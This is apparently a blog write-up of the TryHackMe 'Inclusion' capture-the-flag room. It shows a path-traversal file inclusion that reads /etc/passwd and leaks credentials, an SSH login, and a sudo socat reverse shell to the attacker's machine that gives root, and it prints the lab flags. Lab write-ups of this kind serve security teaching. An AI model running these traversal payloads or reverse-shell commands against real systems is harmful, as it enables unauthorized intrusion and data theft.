---
title: TryHackMe - Inclusion Writeup
description: My writeup on Inclusion box.
categories:
 - tryhackme
tags: tryhackme
---

Hi all, this is my first writeup on this blog.

You can find the machine there > [Inclusion](https://tryhackme.com/room/inclusion){:target="_blank"}

Let's start as always with a nmap scan.

```bash
$ ip=10.10.175.84
$ nmap -sC -sV -oN nmap.txt $ip
Starting Nmap 7.70 ( https://nmap.org ) at 2020-05-13 00:59 EEST
Nmap scan report for 10.10.175.84 (10.10.175.84)
Host is up (0.17s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-title: My blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's start by enumerating port 80. We can see a website running there.

![image1](https://raw.githubusercontent.com/0xatom/0xatom.github.io/master/images/Inclusion1.png)

By clicking one of the "view details" buttons, we can see in URL the `?name=` parameter. Since machine's name is Inclusion we can try for LFI.

```bash
$ curl -s -X GET http://$ip/article?name=../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash
#falconfeast:rootpassword
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
```

Bingo! We can see there this `falconfeast:rootpassword` some creds, SSH is open so we can try to login.

```bash
$ ssh falconfeast@$ip
falconfeast@10.10.175.84's password: 
falconfeast@inclusion:~$ whoami
falconfeast
```

Perfect, now let's try to grain root privileges.

When i privesc i always check `sudo -l` first, let's give it a go.

```bash
falconfeast@inclusion:~$ sudo -l
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
```

We can run `socat` as root, [gtfobins](https://gtfobins.github.io/gtfobins/socat/#sudo){:target="_blank"} here we go!

We open a listener on our machine : ```socat file:`tty`,raw,echo=0 tcp-listen:12345```

On target's box we execute :

```bash
$ RHOST=$your_tun0_ip
$ RPORT=12345
$ sudo socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane
```

We have a root shell & now we can read the flags.

```bash
# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
# cat /home/falconfeast/user.txt; cat /root/root.txt
60989655118397345799
42964104845495153909
```

Before i end this writeup, i want to share something funny with you, i noticed that web server is running as root.

```bash
# netstat -nlpt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      545/python3         
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      485/systemd-resolve 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      598/sshd            
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      664/mysqld          
tcp6       0      0 :::22                   :::*                    LISTEN      598/sshd            
# ps aux | grep 545
root       545  0.3  5.8 652364 28676 ?        Ss   03:26   0:08 /usr/bin/python3 /usr/local/bin/flask run --host=0.0.0.0 --port=80
root      1323  0.0  0.2  14428  1076 ?        S    04:07   0:00 grep 545
```

So we can read both flags without shell/privesc. ;-)

```bash
$ curl -s -X GET http://$ip/article?name=../../../../home/falconfeast/user.txt
60989655118397345799

$ curl -s -X GET http://$ip/article?name=../../../../root/root.txt
42964104845495153909
```

Maker's mistake OR .. ? who knows :P

See you!
